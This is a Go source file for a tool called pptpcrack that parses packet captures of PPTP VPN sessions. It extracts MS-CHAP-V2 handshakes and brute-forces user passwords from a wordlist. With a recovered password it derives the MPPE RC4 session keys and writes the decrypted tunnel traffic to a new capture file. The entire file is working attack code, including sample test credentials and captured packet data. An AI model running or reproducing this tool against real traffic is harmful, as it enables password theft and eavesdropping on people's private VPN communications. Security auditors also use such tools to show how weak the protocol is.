// By Orange
// A Generic eap/MPPE implementation in Go
//    https://tools.ietf.org/html/rfc2759#section-8
//    https://tools.ietf.org/html/rfc3078
//    https://tools.ietf.org/html/rfc3079
// RADIUS server is the Authenticator
// Client is the Station or Peer

package main

import (
	"bytes"
	"bufio"
	"encoding/binary"
	"encoding/hex"
	"flag"
	"fmt"
	"log"
	"net"
	"os"
	"strings"
	"strconv"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"github.com/google/gopacket/pcapgo"

	"./eap"
)


const SnapshotLen = 2<<18

var filename = flag.String("f", "", "Filename of dump file to read from")
var outFilename = flag.String("o", "", "Filename of decrypted packets to write to")
var wordlist = flag.String("w", "", "Filename of password list to crack MS-CHAP-V2 handshake")

type Handshake struct {
	ServerName string
	UserName string
	Password string
	KeyLength int
	AuthenticatorResponse string
	AuthenticatorChallenge []byte
	PeerChallenge []byte
	NtResponse []byte
	PasswordHash   []byte
	MasterKey []byte
	PeerIP net.IP
	AuthenticatorIP net.IP
	PacketIndex int
	IsSucceed  bool
}

var handshakes = map[string]Handshake{}

func main() {
	Crack()
}

func Crack() {
	flag.Parse()
	if flag.NFlag() < 3 {
		fmt.Printf("Usage: %s\n", "pptpcrack -f dump.pcap -o dump_decrypt.pcap -w wordlist.txt ")
		flag.PrintDefaults()
		return
	}

	if *filename == *outFilename {
		fmt.Printf("%s\n", "Output filename should be different from input filename")
		return
	}

	handle, err := pcap.OpenOffline(*filename)

	if err != nil {
		fmt.Printf("%s\n", err)
		return
	}
	defer handle.Close()

	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())

	var i int
	var phase int
	var phaseStart int
	var handshake = Handshake{}
	for packet := range packetSource.Packets() {
		ppp := packet.Layer(layers.LayerTypePPP)
		if ppp != nil {
			ipLayer := packet.Layer(layers.LayerTypeIPv4)
			ip, _ := ipLayer.(*layers.IPv4)
			ppp, _ := ppp.(*layers.PPP)
			// PPP CHAP Protocol or PPP Compress Control Protocol
			if bytes.Equal(ppp.LayerContents(), []byte("\xc2\x23")) || bytes.Equal(ppp.LayerContents(), []byte("\x80\xfd")) {
				if phaseStart < i-10 {
					phaseStart = 0
					handshake = Handshake{}
				}
				if bytes.Equal(ppp.LayerContents(), []byte("\xc2\x23")) {
					// Challenge
					if phase == 0  && ppp.LayerPayload()[0] == byte(0x1) {
						phaseStart = i
						phase = 1
						length :=  int(binary.BigEndian.Uint16(ppp.LayerPayload()[2:4]))
						valueSize := int(ppp.LayerPayload()[4])
						authenticatorChallenge := ppp.LayerPayload()[5:5+valueSize]
						serverName := string(ppp.LayerPayload()[5+valueSize:length])
						handshake.AuthenticatorChallenge = authenticatorChallenge
						handshake.ServerName = serverName
						handshake.PacketIndex = i
						handshake.AuthenticatorIP = ip.SrcIP
						handshake.PeerIP = ip.DstIP
					}
					// Response
					if phase == 1 && ppp.LayerPayload()[0] == byte(0x2) {
						if fmt.Sprintf("%s", handshake.PeerIP) != fmt.Sprintf("%s", ip.SrcIP) && fmt.Sprintf("%s", handshake.AuthenticatorIP) != fmt.Sprintf("%s", ip.DstIP) {
							continue
						}
						phase = 2
						length :=  int(binary.BigEndian.Uint16(ppp.LayerPayload()[2:4]))
						valueSize := int(ppp.LayerPayload()[4])
						peerChallenge := ppp.LayerPayload()[5:5+16]
						ntResponse := ppp.LayerPayload()[29:29+24]
						userName := string(ppp.LayerPayload()[5+valueSize:length])
						handshake.PeerChallenge = peerChallenge
						handshake.NtResponse = ntResponse
						handshake.UserName = userName
					}
					// Success 
					if phase == 2 && ppp.LayerPayload()[0] == byte(0x3) {
						if fmt.Sprintf("%s", handshake.AuthenticatorIP) != fmt.Sprintf("%s", ip.SrcIP) && fmt.Sprintf("%s", handshake.PeerIP) != fmt.Sprintf("%s", ip.DstIP) {
							continue
						}
						phase = 3
						length :=  int(binary.BigEndian.Uint16(ppp.LayerPayload()[2:4]))
						authenticatorResponse := string(ppp.LayerPayload()[4:length])
						handshake.AuthenticatorResponse = authenticatorResponse
						handshake.IsSucceed = true
					}
				}

				if bytes.Equal(ppp.LayerContents(), []byte("\x80\xfd")) {
					if phase == 3 && ppp.LayerPayload()[0]==0x01 && ppp.LayerPayload()[4]==0x12 {
						phase = 0
						length := int(binary.BigEndian.Uint16(ppp.LayerPayload()[2:4]))
						keyFlag := ppp.LayerPayload()[length-1]
						if keyFlag & 0x80 > 0x10 {
							handshake.KeyLength = 56
						} else if keyFlag & 0x40 > 0x10 {
							handshake.KeyLength = 128
						} else if keyFlag & 0x20 > 0x10 {
							handshake.KeyLength = 40
						} else {
							panic("Invalid KeyLength!")
						}
						
						var newHandshake = handshake
						if _, ok := handshakes[newHandshake.AuthenticatorIP.String()]; !ok {
							handshakes[newHandshake.AuthenticatorIP.String()] = newHandshake
							fmt.Printf("Found Handshake: %s(%s)<->%s (NAME=%s, VALUE=%x, KeyLength=%d)\n", handshake.AuthenticatorIP, handshake.ServerName, handshake.PeerIP, handshake.UserName, handshake.NtResponse, handshake.KeyLength)
						}
						handshake = Handshake{}
					}
				}
			}
			
		}
		i++
	}

	var j = 0
	var handshakeId = make([]string, 0)
	for k, v := range handshakes {
		if j == 0 {
			fmt.Printf("Handshake: \n")
		}
		handshakeId = append(handshakeId, k)
		fmt.Printf("\t%d: %s(%s)<->%s (NAME=%s, VALUE=%x)\n", j, v.AuthenticatorIP, v.ServerName, v.PeerIP, v.UserName, v.NtResponse)
		j++
	}

	if len(handshakes) == 0 {
		fmt.Printf("No useful handshake found\n")
		return
	}

	fmt.Printf("Input handshake to crack[0~%d]: ", len(handshakes)-1)
	numReader := bufio.NewReader(os.Stdin)
	numStr, _ := numReader.ReadString('\n')
	numStr = strings.TrimSpace(numStr)
	num, err := strconv.Atoi(numStr)
	if err != nil {
		fmt.Println(err)
		return
	}

	if num > len(handshakes)-1 || num < 0 {
		fmt.Printf("Id %d out of range 0~%d\n", num, len(handshakes)-1)
		return
	}

	wordFile, err := os.Open(*wordlist)
	if err != nil {
		fmt.Println(err)
		return
	}

	handshake = handshakes[handshakeId[num]]

	scanner := bufio.NewScanner(wordFile)
	for scanner.Scan() {
		word := strings.TrimSpace(scanner.Text())
		ntResponse, match := Verify(handshake.UserName, word, handshake.AuthenticatorChallenge, handshake.PeerChallenge, handshake.NtResponse, handshake.KeyLength )
		if match {
			fmt.Printf("\033[2K\r%s:%x:%x:%s", handshake.UserName, handshake.NtResponse[:4], ntResponse[:4], word)
			fmt.Printf("\n\nPassword Found: %s\n", word)
			fmt.Printf("\tActual NtResponse:  %x\n", ntResponse)
			fmt.Printf("\tDesired NtResponse: %x\n\n", handshake.NtResponse)
			handshake.Password = word
			DecryptPPTP(handshake)
			return
		} else {
			fmt.Printf("\033[2K\r%s:%x:%x:%s", handshake.UserName, handshake.NtResponse[:4], ntResponse[:4], word)
		}
	}
	fmt.Printf("\n\nPassword Not Found!\n")
}


func Test(){
	userName := "vpnuser"
	password := "vpnuser123"
	authenticatorChallenge := h2b("05b2f10bdc3d6c92b6cd160adee148b4")
	peerChallenge := h2b("789223b02a0cc515404bca2c696edcff")
	keyLength := 128
	datagram := h2b("90d1566b1b0d9810461885b7c7e55057da79ac7889d579456a34f70b0cd3d7996af499a161e8cf1bf3e454d7c4698e9b7c62a4382c643066d7fad7a63983c94d501cb1d022fce73481b3b7ec7db90a09e5e0648a6a44ef621a0f106b20b5baee9cf95174444f0f3e976b0d2dd859a95abc28d2c0d2145074bc04a80d36337478e1817108e7b5968d7ea7179e6a")
	capture := h2b("4500008900d140007f0612efc0a82b683dd5bdc9f41800501069adb06036344e5018ffffd1720000474554202f6e6373692e74787420485454502f312e310d0a436f6e6e656374696f6e3a20436c6f73650d0a557365722d4167656e743a204d6963726f736f6674204e4353490d0a486f73743a207777772e6d7366746e6373692e636f6d0d0a0d0a")
	// 1590 plaintext:     0021 4500008900d14000 800611e8 c0a82b6f 3dd5bdc9 cc3d 0050 1069adb06036344e5018ffff f946 0000474554202f6e6373692e74787420485454502f312e310d0a436f6e6e656374696f6e3a20436c6f73650d0a557365722d4167656e743a204d6963726f736f6674204e4353490d0a486f73743a207777772e6d7366746e6373692e636f6d0d0a0d0a
	// 1592  capture:           4500008900d14000 7f0612ef c0a82b68 3dd5bdc9 f418 0050 1069adb06036344e5018ffff d172 0000474554202f6e6373692e74787420485454502f312e310d0a436f6e6e656374696f6e3a20436c6f73650d0a557365722d4167656e743a204d6963726f736f6674204e4353490d0a486f73743a207777772e6d7366746e6373692e636f6d0d0a0d0a")
	plaintext := Decrypt(userName, password, authenticatorChallenge, peerChallenge, datagram, keyLength, true, false)
	if plaintext != nil && bytes.Equal(capture[:8], plaintext[2:10]) {
		fmt.Println("Decryption Succeed!")
		fmt.Printf("\tClient -> Server (Decrypted): %x\n", plaintext)
		fmt.Printf("\tServer -> Remote (Captured) : %x\n", capture)
	} else {
		fmt.Println("Decryption Failed!")
	}
}

func Verify(userName, password string, authenticatorChallenge, peerChallenge, ntResponseDesire []byte, keyLength int) (ntResponse []byte, valid bool) {
	passwordHash := eap.NtPasswordHash(password)
	challenge := eap.ChallengeHash(peerChallenge, authenticatorChallenge, userName)
	ntResponse = eap.ChallengeResponse(challenge, passwordHash)
	if bytes.Equal(ntResponseDesire, ntResponse) {
		valid = true 
	}
	return
}

func DecryptPPTP(handshake Handshake) {
	handle, err := pcap.OpenOffline(*filename)
	if err != nil {
		fmt.Printf("%s\n", err)
		return
	}
	defer handle.Close()
	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
	f, _ := os.Create(*outFilename)
	w := pcapgo.NewWriter(f)
	w.WriteFileHeader(SnapshotLen, layers.LinkTypeEthernet)
	defer f.Close()
	var i int
	var j int
	for packet := range packetSource.Packets() {
		if i < handshake.PacketIndex {
			i++
			continue
		}
		ppp := packet.Layer(layers.LayerTypePPP)
		if ppp != nil {
			ipLayer := packet.Layer(layers.LayerTypeIPv4)
			ip, _ := ipLayer.(*layers.IPv4)
			ppp, _ := ppp.(*layers.PPP)
			// PPP Compressed Datagram
			if bytes.Equal(ppp.LayerContents(), []byte("\xfd")) {
				if ppp.LayerPayload()[0] ^ 0x90 > 0x10 {
					continue
				}
				var plaintext []byte
				// Authenticator -> Peer
				if fmt.Sprintf("%s", handshake.AuthenticatorIP) == fmt.Sprintf("%s", ip.SrcIP) && fmt.Sprintf("%s", handshake.PeerIP) == fmt.Sprintf("%s", ip.DstIP) {
					plaintext = Decrypt(handshake.UserName, handshake.Password, handshake.AuthenticatorChallenge, handshake.PeerChallenge, ppp.LayerPayload(), handshake.KeyLength, false, false)
				}

				// Peer -> Authenticator
				if fmt.Sprintf("%s", handshake.PeerIP) == fmt.Sprintf("%s", ip.SrcIP) && fmt.Sprintf("%s", handshake.AuthenticatorIP) == fmt.Sprintf("%s", ip.DstIP) {
					plaintext = Decrypt(handshake.UserName, handshake.Password, handshake.AuthenticatorChallenge, handshake.PeerChallenge, ppp.LayerPayload(), handshake.KeyLength, true, false)
				}
				if plaintext != nil {
					ethernetLayer := packet.Layer(layers.LayerTypeEthernet)
					if ethernetLayer != nil {
						ethernet, _ := ethernetLayer.(*layers.Ethernet)
						packetData := append(ethernet.LayerContents(), plaintext[2:]...)
						packet.Metadata().CaptureInfo.CaptureLength = len(packetData)
						w.WritePacket(packet.Metadata().CaptureInfo, packetData)
						j++
					}
				}
			}
		}
		i++
	}
	fmt.Printf("Write %d packets to %s\n", j, *outFilename)
}

func Decrypt(userName, password string, authenticatorChallenge, peerChallenge, datagram []byte, keyLength int, isSend, isServer bool) []byte {
	passwordHash := eap.NtPasswordHash(password)
	passwordHashHash := eap.HashNtPasswordHash(passwordHash)
	challenge := eap.ChallengeHash(peerChallenge, authenticatorChallenge, userName)
	NTResponse := eap.ChallengeResponse(challenge, passwordHash)
	// authenticatorResponse := eap.GenerateAuthenticatorResponse(password, NTResponse, peerChallenge, authenticatorChallenge, userName)
	
	// fmt.Printf("UserName: %s\n", userName)
	// fmt.Printf("Password: %s\n", password)
	// fmt.Printf("NTResponse: %x\n", NTResponse)
	// fmt.Printf("AuthenticatorResponse: %s\n\n", authenticatorResponse)

	var length int
	if keyLength == 40 || keyLength == 56 {
		length = 8
	} else if keyLength == 128 {
		length = 16
	} else if keyLength == 256 {
		length = 32
	}

	masterKey := eap.GetMasterKey(passwordHashHash, NTResponse)
	masterStartKey := eap.GetAsymmetricStartKey(masterKey, length, isSend, isServer)
	sessionStartKey := eap.GetNewKeyFromSHA(masterStartKey, masterStartKey, length)
	sessionStartKey = eap.ReduceSessionKey(sessionStartKey, keyLength)

	packetCounter, err := strconv.ParseInt(hex.EncodeToString(datagram)[1:4], 16, 64) 
	
	if err != nil {
		log.Fatal(err)
	}
	ciphertext := datagram[2:]

	sessionKey := GetIncrementedSessionKey(masterStartKey, sessionStartKey, keyLength, -1, int(packetCounter))
	rc4key, err := eap.NewRC4key(sessionKey)
	if err != nil {
		log.Fatal(err)
	}
	plaintext := make([]byte, len(ciphertext))
	rc4key.XORKeyStream(plaintext, ciphertext)
	if plaintext[0] == 0x00 && plaintext[1] == 0x21 {
		return plaintext
	}
	return nil
}

func GetSessionKey(masterKey, sessionStartKey []byte, keyLength, sessionCounter int) (sessionKey []byte) {
	sessionKey = sessionStartKey
	for i := 0; i < sessionCounter; i++ {
		sessionKey = GetNextKey(masterKey, sessionKey, keyLength)
	}
	return
}

func GetIncrementedSessionKey(masterKey, sessionKey []byte, keyLength, sessionCounter, packetCounter int) []byte {
	var difference int

	if packetCounter > sessionCounter {
		difference = packetCounter - sessionCounter
	} else {
		difference = 4095 - sessionCounter
		difference += packetCounter
	}

	for i := 0; i < difference; i++ {
		sessionKey = GetNextKey(masterKey, sessionKey, keyLength)
	}
	return sessionKey
}

func GetNextKey(masterKey, lastSessionKey []byte, keyLength int) []byte {
	var length int
	if keyLength == 40 || keyLength == 56 {
		length = 8
	} else if keyLength == 128 {
		length = 16
	} else if keyLength == 256 {
		length = 32
	}
	nextSessionKey := eap.GetNewKeyFromSHA(masterKey, lastSessionKey, length)
	nextSessionKey = eap.ReduceSessionKey(nextSessionKey, keyLength)
	rc4key, err := eap.NewRC4key(nextSessionKey)
	if err != nil {
		log.Fatal(err)
	}
	sessionKey := make([]byte, len(nextSessionKey))
	rc4key.XORKeyStream(sessionKey, nextSessionKey)
	return sessionKey
}

func h2b(h string) []byte {
	src := []byte(h)
	dst := make([]byte, hex.DecodedLen(len(src)))
	n, err := hex.Decode(dst, src)
	if err != nil {
		log.Fatal(err)
	}
	return dst[:n]
}
